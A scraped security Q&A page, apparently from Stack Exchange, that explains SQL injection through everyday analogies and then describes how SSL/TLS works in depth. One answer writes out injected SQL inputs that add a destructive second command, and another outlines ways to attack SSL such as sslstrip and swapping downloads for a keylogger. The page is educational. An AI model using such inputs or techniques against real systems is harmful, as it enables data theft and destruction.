In order to avoid this problem, we must separate the instructions and data in a way that the database (or robot) can easily distinguish. This is usually done by sending them separately. So, in the case of the robot, it would read the blank form containing the instructions, identify where the parameters (i.e. the blank spaces) are, and store it. A user can then walk up and say "1234, B2, 12" and the robot will apply those values to the instructions, without allowing them to be interpreted as instructions themselves. In SQL, this technique is known as parameterised queries.

In the case of the "evil" parameter we gave to the robot, he would now raise a mechanical eyebrow quizzically and say


  Error: Cannot find rack number "12, and throw it out the window. Then go back to your desk and ignore the rest of this form." - are you sure this is a valid input?


Success! We've stopped the robot's "glitch".
AnswerKenntnis:
Here's a real-world non-technical analogy.

You are about to go to the bank to perform a transaction on behalf of your boss. Your boss gave you an envelope with instructions for the cashier.

The instructions read:

Write the balance for account with number 8772344 on this paper.

Signed,
Boss


You leave the envelope out of your sight for a few minutes while you go to the bathroom. A thief opens the envelope and adds above the signature: "Also transfer $500 from account 8772344 to another account with number 12747583.".

Now the full message reads:

Write the balance for account with number 8772344 on this paper.
Also transfer $500 from account 8772344 to another account with number 12747583.
Signed,
Boss


The cashier checks your identification and verifies that you are an authorized person for the account in question and follows the instructions in the letter.

Your boss is the legitimate program code.
You are the program code and database driver that is delivering the SQL code to the database.
The letter is the SQL code that is being passed to the database.
The thief is the attacker.
The cashier is the database.
The identification is typically a login and password to the database.
AnswerKenntnis:
One of the easiest ways to illustrate the problem behind SQL-injection is to use an image like this. The problem is the receiving ends ability to seperate data from command.
AnswerKenntnis:
If you're really explaining to your grandmother, use writing a paper check as an example.  (In the USA) back in the day, you'd write the dollar amount numerically in one field, then you'd write the same thing in words. For example in one field, you'd write "100.00" and in the second, longer field, you'd write "One hundred dollars and zero cents".  If you didn't use the entire long second field, you'd draw a line to keep someone unscrupulous from adding to your written-out amount.

If you made the error of leaving some space in the second, longer field, someone could modify the numerical field, and then use the extra space in the longer field to reflect that. The modifier could obtain more money than you intended when you wrote the check.

SQL injection is the same thing: an error that allows unscruplous people to modify an entry field so that more information comes back to them than the original programmer intended.
AnswerKenntnis:
The idea that first came to mind was to explain it in terms of a Mad Lib. The stories where words are left out, and to fill in the blanks you ask the group for words of the types indicated and write them in, then read the resulting story.

That's the normal way to fill out a Mad Lib. But what if someone else knew the story and what blanks you were filling in (or could guess)? Then, instead of a single word, what if that person gave you a few words? What if the words they gave you included a period ending the sentence? If you filled it in, you may find that what was provided still "fits", but it drastically changes the story more than any one word that you'd normally fill in could ever do. You could, if you had space, add entire paragraphs to the Mad Lib and turn it into something very different.

That, in non-techie terms, is SQL injection in a nutshell. You provide some "blank spaces" for data that will be inserted into a SQL command, much like words into a Mad Lib. An attacker then enters a value that isn't what you expect; instead of a simple value to look for, he enters a piece of a SQL statement that ends the one you wrote, and then adds his own SQL command after that as a new "sentence". The additional statement can be very damaging, like a command to delete the database, or to create a new user with a lot of permissions in the system. The computer, not knowing the difference, will simply perform all the tasks it is commanded to do.
AnswerKenntnis:
I would explain it as being like telling a cashier that the customer is always right and they should do whatever they can to meet the customer's need.  Then since there are no checks about the reasonableness of the request, when a customer comes in and says they want the entire store for free, the cashier loads all the inventory in to their truck for them.

It isn't a perfect explanation, but it gets the idea that the code is being told to do whatever the user puts in and then the bad guy uses that instruction to make off with the goods.

I guess it really depends what kind of a point you are trying to get across.
AnswerKenntnis:
It all depends on the degree of non-technical you're talking about here, but I would usually describe SQL injection to business people something along the lines of -

"a weakness in how some websites handle input from users (e.g. where you put your name into a registration form) which can allow an attacker to get access to the database storing all the user information for the site"

if they want a bit more detail than that.

"Some web applications don't correctly separate user input from the instructions for the database, which can allow attackers to instruct database directly, through the information they fill in the website form. This can allow the attacker to read other users' information out of the database, or change some of the information in there."
AnswerKenntnis:
I think you can get the best effect with just demonstrating the attack. Write a harmless looking web formular and show the result of the query using the user input. Then after entering your own prepared input, your audience will have an "aha-experience" after finding passwords in the result. I made such a demo page, just click the "next arrow" to fill in a prepared input.

P.S. Should you write such a page on your own, be very careful that you do not allow testers to get unwanted privileges. Best is when you alone will run the demo on your local system with the lowest possible database privileges (not all kinds of attacks should be possible, it's just a demo). Make a white-list of allowed expressions.
AnswerKenntnis:
Explain it easy as:

The system can take requests with data from any user to do something with it. 

The system itself has functionality to operate like delete oder change data.

An attacker tries to run any of these functions to gain or destroy something.

Therefore the attacker puts valid commands into the requests.

The system runs these commands, executing whatever the attacker wanted.
AnswerKenntnis:
Imagine a big company that keeps all of its records in paper form in a big room full of filing cabinets. In order to retrieve or make changes to files someone will fill out a simple fill-in-the-blanks form and then that form will be sent to a clerk who follows the instructions on the form.

For example: 


  Retrieve the billing records from start date _ _ _ to end date _ _ _ where the customer is _ _ _


Normally this would become something like this:


  Retrieve the billing records from start date 01/01/2011 to end date 12/31/2011 where the customer is Billy Joe Bob


But in the hands of an unscrupulous person, maybe this form could be used for other purposes, for example:


  Retrieve the billing records from start date 01/01/2011 to end date 12/31/2011 where the customer is Robert Mensas and also retrieve the credit card numbers for all customers


By pretending that their name also includes other commands they can hijack the fill in form, and if the clerk has not been trained to handle these sorts of things then maybe they will simply execute the instructions without thinking about it, and hand over all of the credit card information to a user.

Or, alternately:


  Retrieve the billing records from start date 01/01/2011 to end date 12/31/2011 where the customer is Robert Mensas and also add $100,000 to Robert Mensas' account balance


Which has similarly dangerous potential.

The trick with SQL injections is making sure that your code is smart enough to be able to ensure that users can't change the intent of the commands you are sending to the database and are unable to retrieve data or make changes which they should not be permitted to.
AnswerKenntnis:
The database is like a magical genie (or, Oracle) that grants wishes. We've told our genie to only grant a maximum of three wishes, but if we don't verify what people wish for, then someone would easily outsmart it by asking for something clever like "a hundred more wishes" or "everyone else's wishes".
AnswerKenntnis:
Sometimes hackers will put computer / programming commands into boxes on the internet to trick the website into doing something it shouldn't.  Therefore we check the information entered on websites for what might be a "Command."

... who are you explaining this to anyway?
AnswerKenntnis:
SQL injection is where a malicious user is trying to get information out of a website that they are not authorized access to.

This is a like like interrogating another person, where the interrogator is the malicious user and the person being interrogated is the website.

Things the interrogator might do are:


Research the background of the person to find a weakness
Use various known techniques that have work in the past on other people
Find new techniques to use


Some weaknesses person being interrogated may be:


The training of person
The intelligence of the person
The family of the person
The type of person they are


Things to note are there are better interrogators than others and some people will talk right away while others may never.
AnswerKenntnis:
If you don't need to do it fast and have a piece of paper available, just demonstrate the entire thing. SQL is pretty similar to natural language, so just take a simple query and demonstrate the attack:

 SELECT * FROM data WHERE key = $id


"$id gets replaced by whatever is visible here points to URL parameter. Normally, this is a number like 1. This gives us:"

 SELECT * FROM data WHERE id = 1


"Now, if someone puts more than just a number there, it also gets included. For example, if someone puts in there 1 OR 1 = 1, we get this"

 SELECT * FROM data WHERE id = 1 OR 1 = 1


"Can you see where this is going? Now, on this system, it is also possible to issue multiple commands, called queries, if you just separate them with a semicolon. Can you guess what happens if someone puts in 1; DELETE EVERYTHING;?"

 SELECT * FROM data WHERE id = 1; DELETE EVERYTHING;


"The actual command is DROP DATABASE or DROP TABLE, but you get the idea."
AnswerKenntnis:
Another great way of explaining someone about anything (including SQL Injection) is by the help of cartoon characters and framing a story around them. 

According to me, this is the best picture available on internet, explaining it in a pretty nice way.



Source: http://xkcd.com/327/
AnswerKenntnis:
My approach for a non-techie:


  Assume you are working in a large office building. Every clerk has an own key to its office (=SQL-query the programmer wanted to execute). Now someone takes a needle file and modifies his key a bit, i.e. removing a pin (=SQL-Injection, changing the SQL-query). This modified key can open different (or maybe all doors). So the clerk has access to more or all offices within this house and can read/change documents from other offices.


Everyone is probably used to use keys and locks so it should be easy to understand and from my perspective it is a good analogy to an SQL injection.
AnswerKenntnis:
Well explaining with a technical analogy is fine but I would sound a little long and lame.

I would just explain it's matter of strict paperwork or requirements to limit abuses in administrations and finances.

If it's done in a strict enough manner, you have less evil fishes able to pass through the net.

I would use a simple drawing with some very simple pseudo code with boxes and arrows, and explain the robots and box analogy.
AnswerKenntnis:
Here's my attempt:

Replace "site" with "house" and "attacker|hacker" with "burglar".

SQL injection is the result of leaving the windows open(*with a huge neon light saying "OPEN") of a house while you have 10" thick stainless steel front and back doors.

The burglar wants to break in and steal your stereo system, but first, he needs to figure out how to break in, he sees that the doors are virtually impossible to break, however, on further investigation he sees that the windows are opened. He can't steal your furniture(not in one piece at least), but he can steal your stereo system, laptop, PC, etc.

*) a bit dramatic, I know (:
QuestionKenntnis:
How does SSL work?
qn_description:
How does SSL work? I just realised we don't actually have a definitive answer here, and it's something worth covering.

I'd like to see details in terms of:


A high level description of the protocol.
How the key exchange works.
How authenticity, integrity and confidentiality are enforced.
What the purpose of having CAs is, and how they issue certificates.
Details of any important technologies and standards (e.g. PKCS) that are involved.
AnswersKenntnis
AnswerKenntnis:
General

SSL (and its successor, TLS) is a protocol that operates directly on top of TCP (although there are also implementations for datagram based protocols such as UDP). This way, protocols on higher layers (such as HTTP) can be left unchanged while still providing a secure connection. Underneath the SSL layer, HTTP is identical to HTTPS.

When using SSL/TLS correctly, all an attacker can see on the cable is which IP and domain you are connected to, roughly how much data you are sending, and what encryption and compression is used. He can also terminate the connection, but both sides will know that the connection has been interrupted by a third party.

High-level description of the protocol

After building a TCP connection, the SSL handshake is started by the client. The client (which can be a browser as well as any other program such as Windows Update or PuTTY) sends a number of specifications: which version of SSL/TLS it is running, what ciphersuites it wants to use, and what compression methods it wants to use. The server checks what the highest SSL/TLS version is that is supported by them both, picks a ciphersuite from one of the client's options (if it supports one), and optionally picks a compression method.

After this the basic setup is done, the server sends its certificate. This certificate must be trusted by either the client itself or a party that the client trusts. For example if the client trusts GeoTrust, then the client can trust the certificate from Google.com, because GeoTrust cryptographically signed Google's certificate.

Having verified the certificate and being certain this server really is who he claims to be (and not a man in the middle), a key is exchanged. This can be a public key, a "PreMasterSecret" or simply nothing, depending on the chosen ciphersuite. Both the server and the client can now compute the key for the symmetric encryption whynot PKE?. The client tells the server that from now on, all communication will be encrypted, and sends an encrypted and authenticated message to the server.

The server verifies that the MAC (used for authentication) is correct, and that the message can be correctly decrypted. It then returns a message, which the client verifies as well.

The handshake is now finished, and the two hosts can communicate securely. For more info, see technet.microsoft.com/en-us/library/cc785811 and en.wikipedia.org/wiki/Secure_Sockets_Layer.

To close the connection, a close_notify 'alert' is used. If an attacker tries to terminate the connection by finishing the TCP connection (injecting a FIN packet), both sides will know the connection was improperly terminated. The connection cannot be compromised by this though, merely interrupted.

Some more details

Why can you trust Google.com by trusting GeoTrust?

A website wants to communicate with you securely. In order to prove its identity and make sure that it is not an attacker, you must have the server's public key. However, you can hardly store all keys from all websites on earth, the database would be huge and updates would have to run every hour!

The solution to this are Certificate Authorities, or CA for short. When you installed your operating system or browser, a list of trusted CAs probably came with it. This list can be modified at will; you can remove whom you don't trust, add others, or even make your own CA (though you will be the only one trusting this CA, so it's not much use for public website). In this CA list, the CA's public key is also stored.

When Google's server sends you its certificate, it also mentions it is signed by GeoTrust. If you trust GeoTrust, you can verify (using GeoTrust's public key) that GeoTrust really did sign the server's certificate. To sign a certificate yourself, you need the private key, which is only known to GeoTrust. This way an attacker cannot sign a certificate himself and incorrectly claim to be Google.com. When the certificate has been modified by even one bit, the sign will be incorrect and the client will reject it.

So if I know the public key, the server can prove its identity?

Yes. Typically, the public key encrypts and the private key decrypts. Encrypt a message with the server's public key, send it, and if the server can tell you what it originally said, it just proved that it got the private key without revealing the key.

This is why it is so important to be able to trust the public key: anyone can generate a private/public key pair, also an attacker. You don't want to end up using the public key of an attacker!

If one of the CAs that you trust is compromised, an attacker can use the stolen private key to sign a certificate for any website they like. When the attacker can send a forged certificate to your client, signed by himself with the private key from a CA that you trust, your client doesn't know that the public key is a forged one, signed with a stolen private key.

But a CA can make me trust any server they want!

Yes, and that is where the trust comes in. You have to trust the CA not to make certificates as they please. When organisations like Microsoft, Apple and Mozilla trust a CA though, the CA must have audits; another organisation checks on them periodically to make sure everything is still running according to the rules.

Issuing a certificate is done if, and only if, the registrant can prove they own the domain that the certificate is issued for.

What is this MAC for message authentication?

Every message is signed with a so-called Message Authentication Code, or MAC for short. If we agree on a key and hashing cipher, you can verify that my message comes from me, and I can verify that your message comes from you.

For example with the key "correct horse battery staple" and the message "example", I can compute the MAC "58393". When I send this message with the MAC to you (you already know the key), you can perform the same computation and match up the computed MAC with the MAC that I sent.

An attacker can modify the message, but does not know the key. He cannot compute the correct MAC, and you will know the message is not authentic.

By including a sequence number when computing the MAC, you can eliminate replay attacks. SSL does this.

You said the client sends a key, which is then used to setup symmetric encryption. What prevents an attacker from using it?

The server's public key does. Since we have verified that the public key really belongs to the server and no one else, we can encrypt the key using the public key. When the server receives this, he can decrypt it with the private key. When anyone else receives it, they cannot decrypt it.

This is also why key size matters: The larger the public and private key, the harder it is to crack the key that the client sends to the server.

How to crack SSL

In summary:


Try if the user ignores certificate warnings;
The application may load data from an unencrypted channel (e.g. http), which can be tampered with;
An unprotected login page that submits to HTTPS may be modified so that it submits to HTTP;
Unpatched applications may be vulnerable for exploits like BEAST and CRIME;
Resort to other methods such as a physical attack.


See also: A scheme with many attack vectors against SSL by Ivan Ristic (png)

In detail:

There is no simple and straight-forward way; SSL is secure when done correctly. An attacker can try if the user ignores certificate warnings though, which would break the security instantly. When a user does this, the attacker doesn't need a private key from a CA to forge a certificate, he merely has to send a certificate of his own.

Another way would be by a flaw in the application (server- or client-side). An easy example is in websites: if one of the resources used by the website (such as an image or a script) is loaded over HTTP, the confidentiality cannot be guaranteed anymore. Even though browsers do not send the HTTP Referer header when requesting non-secure resources from a secure page (source), it is still possible for someone eavesdropping on traffic to guess where you're visiting from; for example, if they know images X, Y, and Z are used on one page, they can guess you are visiting that page when they see your browser request those three images at once. Additionally, when loading Javascript, the entire page can be compromised. An attacker can execute any script on the page, modifying for example to whom the bank transaction will go.

When this happens (a resource being loaded over HTTP), the browser gives a mixed-content warning: Chrome, Firefox, Internet Explorer 9

Another trick for HTTP is when the login page is not secured, and it submits to an https page. "Great," the developer probably thought, "now I save server load and the password is still sent encrypted!" The problem is sslstrip, a tool that modifies the insecure login page so that it submits somewhere so that the attacker can read it.

There have also been various attacks in the past few years, such as the TLS renegotiation vulnerability, sslsniff, BEAST, and very recently, CRIME. All common browsers are protected against all of these attacks though, so these vulnerabilities are no risk if you are running an up-to-date browser.

Last but not least, you can resort to other methods to obtain the info that SSL denies you to obtain. If you can already see and tamper with the user's connection, it might not be that hard to replace one of his/her .exe downloads with a keylogger, or simply to physically attack that person. Cryptography may be rather secure, but humans and human error is still a weak factor. According to this paper by Verizon, 10% of the data breaches involved physical attacks (see page 3), so it's certainly something to keep in mind.
AnswerKenntnis:
Since the general concept of SSL has already been covered into some other questions (e.g. this one and that one), this time I will go for details. Details are important. This answer is going to be somewhat verbose.

History

SSL is a protocol with a long history and several versions. First prototypes came from Netscape, when they were developing the first versions of their flagship browser, Netscape Navigator (this browser killed off Mosaic in the early times of the Browser Wars, which are still raging, albeit with new competitors). Version 1 has never been made public so we do not know how it looked like. SSL version 2 is described in a draft which can be read there; it has a number of weaknesses, some of them rather serious, so it is deprecated and newer SSL/TLS implementations do not support it (while older deactivated by default). I will not speak of SSL version 2 any further, except as an occasional reference.

SSL version 3 (which I will call "SSLv3") was an enhanced protocol which still works today and is widely supported. Although still a property of Netscape Communications (or whoever owns that nowadays), the protocol has been published as an "historical RFC" (RFC 6101). Meanwhile, the protocol has been standardized, with a new name in order to avoid legal issues; the new name is TLS.

Three versions of TLS have been produced to far, each with its dedicated RFC: TLS 1.0, TLS 1.1 and TLS 1.2. They are internally very similar with each other, and with SSLv3, to the point that an implementation can easily support SSLv3 and all three TLS versions with at least 95% of the code being common. Still internally, all versions are designated by a version number with the major.minor format; SSLv3 is then 3.0, while the TLS versions are, respectively, 3.1, 3.2 and 3.3. Thus, it is no wonder that TLS 1.0 is sometimes called SSL 3.1 (and it is not incorrect either). SSL 3.0 and TLS 1.0 differ by only some minute details.
TLS 1.1 and 1.2 are not yet widely supported, although there is impetus for that, because of possible weaknesses (see below, for the "BEAST attack"). SSLv3 and TLS 1.0 are supported "everywhere" (even IE 6.0 knows them).

Context

SSL aims at providing a secure bidirectional tunnel for arbitrary data. Consider TCP, the well known protocol for sending data over the Internet. TCP works over the IP "packets" and provides a bidirectional tunnel for bytes; it works for every byte values and send them into two streams which can operate simultaneously. TCP handles the hard work of splitting the data into packets, acknowledging them, reassembling them back into their right order, while removing duplicates and reemitting lost packets. From the point of view of the application which uses TCP, there are just two streams, and the packets are invisible; in particular, the streams are not split into "messages" (it is up to the application to take its own encoding rules if it wishes to have messages, and that's precisely what HTTP does).

TCP is reliable in the presence of "accidents", i.e. transmission errors due to flaky hardware, network congestion, people with smartphones who walk out range of a given base station, and other non-malicious events. However, an ill-intentioned individual (the "attacker") with some access to the transport medium could read all the transmitted data and/or alter it intentionally, and TCP does not protect against that. Hence SSL.

SSL assumes that it works over a TCP-like protocol, which provides a reliable stream; SSL does not implement reemission of lost packets and things like that. The attacker is supposed to be in power to disrupt communication completely in an unavoidable way (for instance, he can cut the cables) so SSL's job is to:


detect alterations (the attacker must not be able to alter the data silently);
ensure data confidentiality (the attacker must not gain knowledge of the exchanged data).


SSL fulfills these goals to a large (but not absolute) extent.

Records

SSL is layered and the bottom layer is the record protocol. Whatever data is sent in a SSL tunnel is split into records. Over the wire (the underlying TCP socket or TCP-like medium), a record looks like this:


  HH V1:V2 L1:L2 data


where:


HH is a single byte which indicates the type of data in the record. Four types are defined: change_cipher_spec (20), alert (21), handshake (22) and application_data (23).
V1:V2 is the protocol version, over two bytes. For all versions currently defined, V1 has value 0x03, while V2 has value 0x00 for SSLv3, 0x01 for TLS 1.0, 0x02 for TLS 1.1 and 0x03 for TLS 1.2.
L1:L2 is the length of data, in bytes (big-endian convention is used: the length is 256*L1+L2). The total length of data cannot exceed 18432 bytes, but in practice it cannot even reach that value.


So a record has a five-byte header, followed by at most 18 kB of data. The data is where symmetric encryption and integrity checks are applied. When a record is emitted, both sender and receiver are supposed to agree on which cryptographic algorithms are currently applied, and with which keys; this agreement is obtained through the handshake protocol, described in the next section. Compression, if any, is also applied at that point.

In full details, the building of a record works like this:


Initially, there are some bytes to transfer; these are application data or some other kind of bytes. This payload consists of at most 16384 bytes, but possibly less (a payload of length 0 is legal, but it turns out that Internet Explorer 6.0 does not like that at all).
The payload is then compressed with whatever compression algorithm is currently agreed upon. Compression is stateful, and thus may depend upon the contents of previous records. In practice, compression is either "null" (no compression at all) or "Deflate" (RFC 3749), the latter being currently courteously but firmly shown the exit door in the Web context, due to the recent CRIME attack. Compression aims at shortening data, but it must necessarily expand it slightly in some unfavourable situations (due to the pigeonhole principle). SSL allows for an expansion of at most 1024 bytes. Of course, null compression never expands (but never shortens either); Deflate will expand by at most 10 bytes, if the implementation is any good.
The compressed payload is then protected against alterations and encrypted. If the current encryption-and-integrity algorithms are "null", then this step is a no-operation. Otherwise, a MAC is appended, then some padding (depending on the encryption algorithm), and the result is encrypted. These steps again induce some expansion, which the SSL standard limits to 1024 extra bytes (combined with the maximum expansion from the compression step, this brings us to the 18432 bytes, to which we must add the 5-byte header).


The MAC is, usually, HMAC with one of the usual hash functions (mostly MD5, SHA-1 or SHA-256)(with SSLv3, this is not the "true" HMAC but something very similar and, to the best of our knowledge, as secure as HMAC). Encryption will use either a block cipher in CBC mode, or the RC4 stream cipher. Note that, in theory, other kinds of modes or algorithms could be employed, for instance one of these nifty modes which combine encryption and integrity checks; there are even some RFC for that. In practice, though, deployed implementations do not know of these yet, so they do HMAC and CBC. Crucially, the MAC is first computed and appended to the data, and the result is encrypted. This is MAC-then-encrypt and it is actually not a very good idea. The MAC is computed over the concatenation of the (compressed) payload and a sequence number, so that an industrious attacker may not swap records.

Handshake

The handshake is a protocol which is played within the record protocol. Its goal is to establish the algorithms and keys which are to be used for the records. It consists of messages. Each handshake message begins with a four-byte header, one byte which describes the message type, then three bytes for the message length (big-endian convention). The successive handshake messages are then sent with records tagged with the "handshake" type (first byte of the header of each record has value 22).

Note the layers: the handshake messages, complete with four-byte header, are then sent as records, and each record also has its own header. Furthermore, several handshake messages can be sent within the same record, and a given handshake message can be split over several records. From the point of view of the module which builds the handshake messages, the "records" are just a stream on which bytes can be sent; it is oblivious to the actual split of that stream into records.

Full Handshake

Initially, client and server "agree upon" null encryption with no MAC and null compression. This means that the record they will first send will be sent as cleartext and unprotected.

First message of a handshake is a ClientHello. It is the message by which the client states its intention to do some SSL. Note that "client" is a symbolic role; it means "the party which speaks first". It so happens that in the HTTPS context, which is HTTP-within-SSL-within-TCP, all three layers have a notion of "client" and "server", and they all agree (the TCP client is also the SSL client and the HTTP client), but that's kind of a coincidence.

The ClientHello message contains:


the maximum protocol version that the client wishes to support;
the "client random" (32 bytes, out of which 28 are suppose to be generated with a cryptographically strong number generator);
the "session ID" (in case the client wants to resume a session in an abbreviated handshake, see below);
the list of "cipher suites" that the client knows of, ordered by client preference;
the list of compression algorithms that the client knows of, ordered by client preference;
some optional extensions.


A cipher suite is a 16-bit symbolic identifier for a set of cryptographic algorithms. For instance, the TLS_RSA_WITH_AES_128_CBC_SHA cipher suite has value 0x002F, and means "records use HMAC/SHA-1 and AES encryption with a 128-bit key, and the key exchange is done by encrypting a random key with the server's RSA public key".

The server responds to the ClientHello with a ServerHello which contains:


the protocol version that the client and server will use;
the "server random" (32 bytes, with 28 random bytes);
the session ID for this connection;
the cipher suite that will be used;
the compression algorithm that will be used;
optionally, some extensions.


The full handshake looks like this:

  Client                                               Server

  ClientHello                  -------->
                                                  ServerHello
                                                 Certificate*
                                           ServerKeyExchange*
                                          CertificateRequest*
                               <--------      ServerHelloDone
  Certificate*
  ClientKeyExchange
  CertificateVerify*
  [ChangeCipherSpec]
  Finished                     -------->
                                           [ChangeCipherSpec]
                               <--------             Finished
  Application Data             <------->     Application Data


(This schema has been shamelessly copied from the RFC.)

We see the ClientHello and ServerHello. Then, the server sends a few other messages, which depend on the cipher suite and some other parameters:


Certificate: the server's certificate, which contains its public key. More on that below. This message is almost always sent, except if the cipher suite mandates a handshake without a certificate.
ServerKeyExchange: some extra values for the key exchange, if what is in the certificate is not sufficient. In particular, the "DHE" cipher suites use an ephemeral Diffie-Hellman key exchange, which requires that message.
CertificateRequest: a message requesting that the client also identifies itself with a certificate of its own. This message contains the list of names of trust anchors (aka "root certificates") that the server will use to validate the client certificate.
ServerHelloDone: a marker message (of length zero) which says that the server is finished, and the client should now talk.


The client must then respond with:


Certificate: the client certificate, if the server requested one. There are subtle variations between versions (with SSLv3, the client must omit this message if it does not have a certificate; with TLS 1.0+, in the same situation, it must send a Certificate message with an empty list of certificates).
ClientKeyExchange: the client part of the actual key exchange (e.g. some random value encrypted with the server RSA key).
CertificateVerify: a digital signature computed by the client over all previous handshake messages. This message is sent when the server requested a client certificate, and the client complied. This is how the client proves to the server that it really "owns" the public key which is encoded in the certificate it sent.


Then the client sends a ChangeCipherSpec message, which is not a handshake message: it has its own record type, so it will be sent in a record of its own. Its contents are purely symbolic (a single byte of value 1). This message marks the point at which the client switches to the newly negotiated cipher suite and keys. The subsequent records from the client will then be encrypted.

The Finished message is a cryptographic checksum computed over all previous handshake messages (from both the client and server). Since it is emitted after the ChangeCipherSpec, it is also covered by the integrity check and the encryption. When the server receives that message and verifies its contents, it obtains a proof that it has indeed talked to the same client all along. This message protects the handshake from alterations (the attacker cannot modify the handshake messages and still get the Finished message right).

The server finally responds with its own ChangeCipherSpec then Finished. At that point, the handshake is finished, and the client and server may exchange application data (in encrypted records tagged as such).

To remember: the client suggests but the server chooses. The cipher suite is in the hands of the server. Courteous servers are supposed to follow the preferences of the client (if possible), but they can do otherwise and some actually do (e.g. as part of protection against BEAST).

Abbreviated Handshake

In the full handshake, the server sends a "session ID" (i.e. a bunch of up to 32 bytes) to the client. Later on, the client can come back and send the same session ID as part of his ClientHello. This means that the client still remembers the cipher suite and keys from the previous handshake and would like to reuse these parameters. If the server also remembers the cipher suite and keys, then it copies that specific session ID in its ServerHello, and then follows the abbreviated handshake:

  Client                                                Server

  ClientHello                   -------->
                                                   ServerHello
                                            [ChangeCipherSpec]
                                <--------             Finished
  [ChangeCipherSpec]
  Finished                      -------->
  Application Data              <------->     Application Data


The abbreviated handshake is shorter: less messages, no asymmetric cryptography business, and, most importantly, reduced latency. Web browsers and servers do that a lot. A typical Web browser will open a SSL connection with a full handshake, then do abbreviated handshakes for all other connections to the same server: the other connections it opens in parallel, and also the subsequent connections to the same server. Indeed, typical Web servers will close connections after 15 seconds of inactivity, but they will remember sessions (the cipher suite and keys) for a lot longer (possibly for hours or even days).

Key Exchange

There are several key exchange algorithms which SSL can use. This is specified by the cipher suite; each key exchange algorithm works with some kinds of server public key. The most common key exchange algorithms are:


RSA: the server's key is of type RSA. The client generates a random value (the "pre-master secret" of 48 bytes, out of which 46 are random) and encrypts it with the server's public key. There is no ServerKeyExchange.
DHE_RSA: the server's key is of type RSA, but used only for signature. The actual key exchange uses Diffie-Hellman. The server sends a ServerKeyExchange message containing the DH parameters (modulus, generator) and a newly-generated DH public key; moreover, the server signs this message. The client will respond with a ClientKeyExchange message which also contains a newly-generated DH public key. The DH yields the "pre-master secret".
DHE_DSS: like DHE_RSA, but the server has a DSS key ("DSS" is also known as "DSA"). DSS is a signature-only algorithm.


Less commonly used key exchange algorithms include:


DH: the server's key is of type Diffie-Hellman (we are talking of a certificate which contains a DH key). This used to be "popular" in an administrative way (US federal government mandated its use) when the RSA patent was still active (this was during the previous century). Despite the bureaucratic push, it was never as widely deployed as RSA.
DH_anon: like the DHE suites, but without the signature from the server. This is a certificate-less cipher suite. By construction, it is vulnerable to Man-in-the-Middle attacks, thus very rarely enabled at all.
PSK: pre-shared key cipher suites. The symmetric-only key exchange, building on a pre-established shared secret.
SRP: application of the SRP protocol which is a Password Authenticated Key Exchange protocol. Client and server authenticate each other with regards to a shared secret, which can be a low-entropy password (whereas PSK requires a high-entropy shared secret). Very nifty. Not widely supported yet.
An ephemeral RSA key: like DHE but with a newly-generated RSA key pair. Since generating RSA keys is expensive, this is not a popular option, and was specified only as part of "export" cipher suites which complied to the pre-2000 US export regulations on cryptography (i.e. RSA keys of at most 512 bits). Nobody does that nowadays.
Variants of the DH* algorithms with elliptic curves. Very fashionable. Should become common in the future.


Certificates and Authentication

Digital certificates are vessels for asymmetric keys. They are intended to solve key distribution. Namely, the client wants to use the server's public key. The attacker will try to make the client use the attacker's public key. So the client must have a way to make sure that it is using the right key.

SSL is supposed to use X.509. This is a standard for certificates. Each certificate is signed by a Certification Authority. The idea is that the client inherently knows the public keys of a handful of CA (these are the "trust anchors" or "root certificates"). With these keys, the client can verify the signature computed by a CA over a certificate which has been issued to the server. This process can be extended recursively: a CA can issue a certificate for another CA (i.e. sign the certificate structure which contains the other CA name and key). A chain of certificates beginning with a root CA and ending with the server's certificate, with intermediate CA certificates in between, each certificate being signed relatively to the public key which is encoded in the previous certificate, is called, unimaginatively, a certificate chain.

So the client is supposed to do the following:


Get a certificate chain ending with the server's certificate. The Certificate message from the server is supposed to contain, precisely, such a chain.
Validate the chain, i.e. verifying all the signatures and names and the various X.509 bits. Also, the client should check revocation status of all the certificates in the chain, which is complex and heavy (Web browsers now do it, more or less, but it is a recent development).
Verify that the intended server name is indeed written in the server's certificate. Because the client does not only want to use a validated public key, it also wants to use the public key of a specific server. See RFC 2818 for details on how this is done in a HTTPS context.


The certification model with X.509 certificates has often been criticized, not really on technical grounds, but rather for politico-economic reasons. It concentrates validation power into the hands of a few players, who are not necessarily well-intentioned, or at least not always competent. Now and again, proposals for other systems are published (e.g. Convergence or DNSSEC) but none has gained wide acceptance (yet).

For certificate-based client authentication, it is entirely up to the server to decide what to do with a client certificate (and also what to do with a client who declined to send a certificate). In the Windows/IIS/Active Directory world, a client certificate should contain an account name as a "User Principal Name" (encoded in a Subject Alt Name extension of the certificate); the server looks it up in its Active Directory server.

Handshake Again

Since a handshake is just some messages which are sent as records with the current encryption/compression conventions, nothing theoretically prevents a SSL client and server from doing a second handshake within an established SSL connection. And, indeed, it is supported and it happens in practice.

At any time, the client or the server can initiate a new handshake (the server can send a HelloRequest message to trigger it; the client just sends a ClientHello). A typical situation is the following:


An HTTPS server is configured to listen to SSL requests.
A client connects and a handshake is performed.
Once the handshake is done, the client sends its "applicative data", which consists of a HTTP request. At that point (and at that point only), the server learns the target path. Up to that point, the URL which the client wishes to reach was unknown to the server (the server might have been made aware of the target server name through a Server Name Indication SSL extension, but this does not include the path).
Upon seeing the path, the server may learn that this is for a part of its data which is supposed to be accessed only by clients authenticated with certificates. But the server did not ask for a client certificate in the handshake (in particular because not-so-old Web browsers displayed freakish popups when asked for a certificate, in particular if they did not have one, so a server would refrain from asking a certificate if it did not have good reason to believe that the client has one and knows how to use it).
Therefore, the server triggers a new handshake, this time requesting a certificate.


There is an interesting weakness in the situation I just described; see RFC 5746 for a workaround. In a conceptual way, SSL transfers security characteristics only in the "forward" way. When doing a new handshake, whatever could be known about the client before the new handshake is still valid after (e.g. if the client had sent a good username+password within the tunnel) but not the other way round. In the situation above, the first HTTP request which was received before the new handshake is not covered by the certificate-based authentication of the second handshake, and it would have been chosen by he attacker ! Unfortunately, some Web servers just assumed that the client authentication from the second handshake extended to what was sent before that second handshake, and it allowed some nasty tricks from the attacker. RFC 5746 attempts at fixing that.

Alerts

Alert messages are just warning and error messages. They are rather uninteresting except when they could be subverted from some attacks (see later on).

There is an important alert message, called close_notify: it is a message which the client or the server sends when it wishes to close the connection. Upon receiving this message, the server or client must also respond with a close_notify and then consider the tunnel to be closed (but the session is still valid, and can be reused in an ulterior abbreviated handshake). The interesting part is that these alert messages are, like all other records, protected by the encryption and MAC. Thus, the connection closure is covered by the cryptographic umbrella.

